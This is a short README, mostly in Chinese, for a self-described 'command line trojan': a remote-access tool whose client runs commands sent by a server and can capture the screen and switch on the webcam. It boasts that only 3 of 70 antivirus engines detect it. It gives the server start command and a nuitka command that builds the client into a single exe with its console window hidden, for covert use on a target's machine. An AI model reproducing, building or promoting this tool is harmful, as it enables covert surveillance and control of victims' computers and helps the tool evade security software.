# Command-line-telecommute

Command line trojan

- 这是一个 类似反向代理的程序，已经过部分检测，3/70 的被检测的概率，因为这个的逻辑十分的简单，都是正常操作，把文本传到客户端，然后客户端本地执行传过来的命令，所以说被检测到的比较少。
- server端用法：python3 main.py server
- 客户端用法：直接编辑好端口打包成exe进行运行
- 打包命令:nuitka --standalone --onefile --windows-disable-console client.py
- 拥有截图功能

![image.png](images/image.png)
命令在连接后有提示，可以屏幕截图和调用摄像头

![received_screenshot.jpg](images/1bafdea80207047e4951ab1dfbfd347.png)
![received_screenshot.jpg](images/imag.jpg)
